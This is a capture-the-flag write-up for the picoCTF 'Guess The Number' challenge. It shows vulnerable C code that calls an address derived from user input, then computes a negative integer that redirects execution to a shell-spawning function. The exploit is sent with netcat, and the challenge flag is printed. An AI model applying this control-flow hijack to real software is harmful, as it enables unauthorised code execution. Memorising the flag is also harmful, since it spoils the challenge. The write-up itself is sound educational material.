# Guess The Number
```
Just a simple number-guessing game. How hard could it be? Binary Source. Connect on shell2017.picoctf.com:40780.
HINTS
What is the program doing with your input number?
strtol checks for overflow, but it does allow negative numbers...
```

Taking a look at the main function, it calls the funciton at an address of the input value shifted 4 bits right. 

```C
int main(int argc, char **argv) {
    uintptr_t val;
    ...

    printf("Enter your number: ");
    scanf("%32s", buf);
    val = strtol(buf, NULL, 10);

    printf("You entered %d. Let's see if it was right...\n", val);

    val >>= 4;
    ((void (*)(void))val)();
}
```

In order to get a shell we need to call the win function.

```C
void win(void) {
    printf("Congratulations! Have a shell:\n");
    system("/bin/sh -i");
}
```

Let's find the address of the win function using gdb.

```
$ gdb guess_num -q
Reading symbols from guess_num...(no debugging symbols found)...done.
(gdb) p win
$1 = {<text variable, no debug info>} 0x804852b <win>
(gdb)
```

The input value is input as a sign integer; when shifted 4 bits right it needs to equal 0x804852b. Using a languaged with easily accessibly bit shifts and signed integer types we can calculated 0x804852b as a signed integer shifted 4 bits to the left. We used the following java snippet.

```Java
public class Main {
    public static void main(String[] args) {
        System.out.println(0x804852b << 4);
    }
}
```

After compiling and running the program we get our result.

```
$ javac Main.java
$ java Main
-2142743888
$
```

When input, this value will cause the program to call the function at the memory address for the win function, giving us a shell. Then, we cat the flag. Here we pipe the output of our java program to the netcat application running on their server.

```
$ (java Main; cat) | nc shell2017.picoctf.com 40780
Welcome to the number guessing game!
I'm thinking of a number. Can you guess it?
Guess right and you get a shell!
Enter your number: You entered -2142743888. Let's see if it was right...
Congratulations! Have a shell:
/bin/sh: 0: can't access tty; job control turned off
$ cat flag.txt
e08d404edccb7d8259f1fe02acd34894
$

```





